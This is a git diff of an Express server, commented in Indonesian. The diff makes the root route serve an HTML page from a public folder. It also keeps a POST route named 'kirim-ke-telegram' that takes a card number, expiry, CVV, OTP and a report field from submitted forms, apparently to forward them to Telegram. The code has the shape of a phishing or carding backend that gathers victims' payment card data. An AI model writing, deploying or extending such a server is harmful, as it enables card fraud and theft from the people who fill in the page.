@@ -1,5 +1,6 @@
 const express = require('express');
 const fetch = require('node-fetch');
+const path = require('path');
 const dotenv = require('dotenv');
 dotenv.config();
 
@@ -10,14 +11,14 @@ const PORT = process.env.PORT || 3000;
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// ➕ Tambahkan route ke halaman utama
+// ➕ Arahkan route '/' ke file HTML
 app.get('/', (req, res) => {
-  res.send('✅ Server berjalan dengan baik. Gunakan endpoint POST /kirim-ke-telegram untuk mengirim data.');
+  res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// ⬇️ ROUTE terlebih dahulu agar tidak tertutup static
+// ⬇️ ROUTE untuk kirim data ke Telegram
 app.post('/kirim-ke-telegram', async (req, res) => {
-  console.log("Data diterima:", req.body); // debug log
+  console.log("Data diterima:", req.body);
 
   const { nomor, valid, cvv, otp, laporan } = req.body;
 
@@ -60,8 +61,8 @@ app.post('/kirim-ke-telegram', async (req, res) => {
   }
 });
 
-// ⬇️ Public folder diakses setelah route
-app.use(express.static(__dirname + '/public'));
+// ⬇️ Folder public untuk file statis
+app.use(express.static(path.join(__dirname, 'public')));
 
 // Jalankan server
 app.listen(PORT, () => {
